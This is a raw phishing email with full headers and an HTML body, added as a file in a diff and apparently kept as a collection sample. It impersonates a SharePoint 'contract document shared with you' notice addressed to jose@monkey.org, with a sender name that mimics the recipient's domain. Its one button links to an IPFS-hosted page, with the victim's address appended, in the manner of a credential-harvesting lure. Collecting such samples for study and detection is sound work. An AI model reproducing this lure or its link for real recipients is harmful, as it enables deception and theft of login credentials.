@@ -1,0 +1,124 @@
+From jose@monkey.org Tue May  9 04:41:38 2023 +0000
+Return-Path: wwwsmtp@dotsquares.com
+Delivered-To: jose@monkey.org
+X-FDA: 80769468276.36.51330DA
+Received: from usserver1.24livehost.com (usserver1.24livehost.com [69.175.82.22])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP id 32C8C160017
+	for <jose@monkey.org>; Tue,  9 May 2023 04:41:36 +0000 (UTC)
+Authentication-Results: imf22.b.hostedemail.com;
+	dkim=pass header.d=dotsquares.com header.s=default header.b=DMDM4dpB;
+	dmarc=pass (policy=none) header.from=dotsquares.com;
+	spf=pass (imf22.b.hostedemail.com: domain of wwwsmtp@dotsquares.com designates 69.175.82.22 as permitted sender) smtp.mailfrom=wwwsmtp@dotsquares.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1683607296;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=dKAOXgyHNbE5jdkHGpjjlHI/X1zVKn4eXCnOP7OdMak=;
+	b=LKLTKw/5vKsnbDjDNouTKSajakJw5LB8Iw8HKwnWF/NKPCfibdj8Cm0VPh35+3/VsnRGoM
+	dCbNU2Qy4mITR03P8kzhwh+DCETsEXekmIQmE8m+40ecjO8ETe4E/HJ28Qid6ceAnEdW5S
+	SUWXlHr0SOxCKjWKEkC9+mdhBNxaGl0=
+ARC-Authentication-Results: i=1;
+	imf22.b.hostedemail.com;
+	dkim=pass header.d=dotsquares.com header.s=default header.b=DMDM4dpB;
+	dmarc=pass (policy=none) header.from=dotsquares.com;
+	spf=pass (imf22.b.hostedemail.com: domain of wwwsmtp@dotsquares.com designates 69.175.82.22 as permitted sender) smtp.mailfrom=wwwsmtp@dotsquares.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1683607296; a=rsa-sha256;
+	cv=none;
+	b=vqJNwR2rAvcDuGmAFuD5Sqv8cKc1FSxvWJzLTIz2nKZRNIPA4mpV5akTM0fSp0uITi6lCe
+	0qQzprdnIiOXHvfCXkCqRpWy7Y/QoydfeKmkJViUx9oSOl6FyZ7U1qDliW2/FhpL7RGi1g
+	6up+ylO1BJz6wJi/ZBgy0FUVdbqO7TU=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=dotsquares.com; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=dKAOXgyHNbE5jdkHGpjjlHI/X1zVKn4eXCnOP7OdMak=; b=DMDM4dpBxiJGZUguYBsBYnnPC0
+	sV1tEyqcA8UunJiMOsequXetV9RAFH8f3Kp3zJJBLjdzbUVI6hNcxtFchjWa/dBIVOOiBCR3tAlo+
+	8EtzNk8A0AXAx/KiADpJ5ZduBgdrRgXgHUvmP60Oj9mByWFyyHC6MdPcOWVSg78svcMLb1LUSvSP2
+	8pGbTjkXOR1kTcSx0XDJ0s4bAvuHL3dZ0BB46/6+eVMDLog0frAvz2hFG60kH8Gcn8PQoDkm6m8ra
+	APK9XmYul2GsnKpTf7QVJWIcWpuQhWZXmVJY087GbCiNW5OUw4w71jNQZSBBXfJX6X94nHBCdYvJN
+	vx4mx30Q==;
+Received: from 54.115.64.34.bc.googleusercontent.com ([34.64.115.54]:59166 helo=dotsquares.com)
+	by usserver1.24livehost.com with esmtpa (Exim 4.93)
+	(envelope-from <wwwsmtp@dotsquares.com>)
+	id 1pwFAM-000ENF-7E
+	for jose@monkey.org; Tue, 09 May 2023 00:41:34 -0400
+From: monkey.org  <wwwsmtp@dotsquares.com>
+To: jose@monkey.org
+Subject: A new contract document has been shared with you on default Sharepoint
+Date: 09 May 2023 04:41:34 +0000
+Message-ID: <20230509044133.A3CF9B3DB69770C7@dotsquares.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - usserver1.24livehost.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - dotsquares.com
+X-Get-Message-Sender-Via: usserver1.24livehost.com: authenticated_id: wwwsmtp@dotsquares.com
+X-Authenticated-Sender: usserver1.24livehost.com: wwwsmtp@dotsquares.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 32C8C160017
+X-Stat-Signature: nubzum3biahr8t6rnintkp17r17z1d57
+X-Rspam-User: 
+X-Spam-Status: No, score=5.30
+X-HE-Tag: 1683607296-722755
+X-HE-Meta: U2FsdGVkX1+8evvLiJ4xVCEEMDIGMF3BubPMWT5bx7sz0UfdEQr6RM0bbc3kIHlH1LSf1VcC19yKBj18MEniybqPy9dKH+H512b/NrSahO0T+q1sii/mI+oi5YkNBZXTu4C2eMnZ59RedQIT3/LFEjDM7iR/h9Nz4Yy8ww4mVxxrnE0K6UuGWFoPgnbZvENH3y3Pbh0CwT5wgDkOF8f2fUvAzHhr552roCoXFw7AcoBS2rzpwpg5gyFCP2jkwmWuFJCQgMUh34iSHqBJxfGB5D3uDTxqXiyEsEGYs4JHnPEdoAtW+MLvOn1u/OzIigRHPT21WHUDZMrUxR0NeuaFFjr2KxYqRqxFmmQXqWYnXF0cn2/xAeRm7xs0FroRSJz8/8exlIeDtHQbzLUhuK8RqXkhB3o+tV+DVbGy+hd0hqXkURcmiV9bZuQ5ETbP4/QOk1bKZbFRVrO5HqG8OwdBKXa8so9CWsHkGxJsdaTTMpT7Khz17ssdr1EWZdtPnVla
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 101
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><p>&nbsp;<br class=3D"Apple-interchange-newline"></p><table width=3D"=
+100%" style=3D"color: rgb(33, 33, 33); font-size: 16px;" border=3D"0" cells=
+pacing=3D"0" cellpadding=3D"0" color=3D""><tbody>
+<tr style=3D"color: rgb(33, 33, 33); text-transform: none; text-indent: 0px=
+; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-s=
+ize: 16px; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">
+<td align=3D"center" style=3D"margin: 0px;"><table width=3D"604" bgcolor=3D=
+"#f5f6fa" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td a=
+lign=3D"center" style=3D"margin: 0px; padding: 20px 0px 0px; border-top-col=
+or: rgb(28, 28, 28); border-top-width: 4px; border-top-style: solid;"><font=
+ color=3D"#1c1c1c" face=3D"Segoe UI, Tahoma, Geneva, Verdana, sans-serif"><=
+span style=3D"font-size: 33px;">Contract Documents</span></font></td></tr><=
+tr><td width=3D"260" align=3D"center" style=3D"margin: 0px; padding: 20px 0=
+px;">
+<div style=3D"width: 100px; height: 100px; background-color: rgb(0, 168, 25=
+5);"><span style=3D"color: rgb(255, 255, 255); line-height: 50px; font-size=
+: 50px;"></span></div><br></td></tr><tr><td align=3D"center" style=3D"margi=
+n: 0px; padding: 0px 132px 10px;"><h3 style=3D"margin: 0px; color: rgb(22, =
+35, 58);">SHAREPOINT&nbsp;</h3></td></tr><tr><td align=3D"center" style=3D"=
+margin: 0px; padding-bottom: 20px;"><p style=3D"margin: 0px; padding: 0px 6=
+0px; font-size: 0.9em;">
+A new contract document has been shared with you jose@monkey.org on Sharepo=
+int Storage.</p><p><strong>Message: Please study Documents properly for con=
+tract meeting presentation</strong></p><strong></strong></td></tr></tbody><=
+/table><table width=3D"604" bgcolor=3D"#f5f6fa" border=3D"0" cellspacing=3D=
+"0" cellpadding=3D"0"><tbody><tr><td align=3D"center" style=3D"margin: 0px;=
+ padding: 5px 162px 40px;"><table width=3D"280" border=3D"0" cellspacing=3D=
+"0" cellpadding=3D"0"><tbody><tr>
+<td width=3D"280" align=3D"center" style=3D"margin: 0px; padding: 10px 0px;=
+ border: 2px solid rgb(28, 28, 28); border-image: none;" bgcolor=3D"white">=
+
+<a style=3D"color: rgb(17, 85, 204); font-size: 14px;" href=3D"https://ipfs=
+=2Eio/ipfs/bafybeigjolnfzalsehupxlpocugywmfcfvskrkkvdmplr5jg2smui73y2y/#jos=
+e@monkey.org" target=3D"_blank" rel=3D"noopener noreferrer" data-saferedire=
+cturl=3D"" clicktracking=3D"off"><b>View&nbsp;"jose@monkey.org"&nbsp;Docume=
+nts</b></a></td></tr></tbody></table>
+</td></tr></tbody></table></td></tr></tbody></table></body></html>
